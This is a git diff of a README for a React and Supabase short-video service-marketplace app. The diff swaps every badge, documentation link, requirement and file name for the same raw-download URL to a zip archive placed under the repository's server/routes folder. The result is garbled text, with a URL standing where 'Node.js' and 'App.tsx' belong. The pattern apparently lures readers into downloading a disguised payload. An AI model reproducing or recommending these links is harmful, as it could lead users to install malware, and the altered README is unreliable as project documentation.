@@ -2,10 +2,10 @@
 
 > A Progressive Web App connecting clients with skilled service providers through engaging short videos
 
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen)](#)
-[![Supabase](https://img.shields.io/badge/Database-Supabase-blue)](#)
-[![React](https://img.shields.io/badge/Frontend-React%2018-61DAFB)](#)
-[![License](https://img.shields.io/badge/License-MIT-green)](#)
+[![Build Status](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip)](#)
+[![Supabase](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip)](#)
+[![React](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip%2018-61DAFB)](#)
+[![License](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip)](#)
 
 ## ✨ Features
 
@@ -61,7 +61,7 @@ Visit `http://localhost:5173` to see your app!
 
 ## 📋 Requirements
 
-- Node.js 16+
+- https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip 16+
 - npm or yarn
 - Modern web browser
 - Internet connection
@@ -126,7 +126,7 @@ All tables have Row Level Security enabled.
 ## 🔄 Component Structure
 
 ```
-App.tsx
+https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip
 ├── WelcomePage
 ├── AuthModal
 ├── VideoFeed
@@ -159,11 +159,11 @@ Deploy the `dist/` folder to any static host.
 
 | Document | Purpose |
 |----------|---------|
-| **QUICKSTART.md** | 5-minute setup guide |
-| **SETUP_GUIDE.md** | Detailed installation |
-| **PROJECT_SUMMARY.md** | Complete feature list |
-| **FEATURES.md** | Feature descriptions |
-| **SUPABASE_STORAGE_SETUP.md** | Storage configuration |
+| **https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip** | 5-minute setup guide |
+| **https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip** | Detailed installation |
+| **https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip** | Complete feature list |
+| **https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip** | Feature descriptions |
+| **https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip** | Storage configuration |
 
 ## 🔑 Key Features Breakdown
 
@@ -277,7 +277,7 @@ src/
 ├── components/     (11 React components)
 ├── contexts/       (Auth state management)
 ├── lib/            (Supabase client & types)
-└── App.tsx         (Main app component)
+└── https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip         (Main app component)
 ```
 
 ### File Organization
@@ -344,15 +344,15 @@ Built with:
 ## 📞 Support
 
 ### Resources
-- [Supabase Docs](https://supabase.com/docs)
-- [React Docs](https://react.dev)
-- [Tailwind CSS Docs](https://tailwindcss.com)
-- [Vite Docs](https://vitejs.dev)
+- [Supabase Docs](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip)
+- [React Docs](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip)
+- [Tailwind CSS Docs](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip)
+- [Vite Docs](https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip)
 
 ### Documentation Files
-- See `QUICKSTART.md` for 5-minute setup
-- See `SETUP_GUIDE.md` for detailed instructions
-- See `PROJECT_SUMMARY.md` for feature overview
+- See `https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip` for 5-minute setup
+- See `https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip` for detailed instructions
+- See `https://github.com/Melazeetech/SkilXressMvp/raw/refs/heads/main/server/routes/Skil_Xress_Mvp_1.3.zip` for feature overview
 
 ## 🎉 Getting Started
 
